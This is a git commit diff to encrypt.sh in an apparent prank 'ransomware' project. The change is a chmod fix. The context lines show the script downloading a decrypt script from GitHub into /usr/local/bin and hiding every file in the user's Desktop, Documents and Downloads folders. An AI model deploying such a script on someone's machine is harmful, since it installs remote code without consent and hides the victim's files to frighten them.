750694a34f0af529335e7c54a107a749ad9f628f
FoxDev <91700492+ItsFoxDev@users.noreply.github.com>
2022-06-30 13:17:31 -0400

    🚧 Fixed CHMOD command

--- encrypt.sh
+++ encrypt.sh
@@ -2,7 +2,7 @@ if [ ! -d "/usr/local/bin" ]; then
   sudo mkdir /usr/local/bin
 fi
 curl -fsSL "https://raw.githubusercontent.com/ItsFoxDev/AprilFoolsRansomware/main/decrypt.sh" -o /usr/local/bin/decryptfiles
-chmod +x /usr/local/bin/decryptfiles
+chmod 755 /usr/local/bin/decryptfiles
 chflags hidden ~/Desktop/*
 chflags hidden ~/Documents/*
 chflags hidden ~/Downloads/*
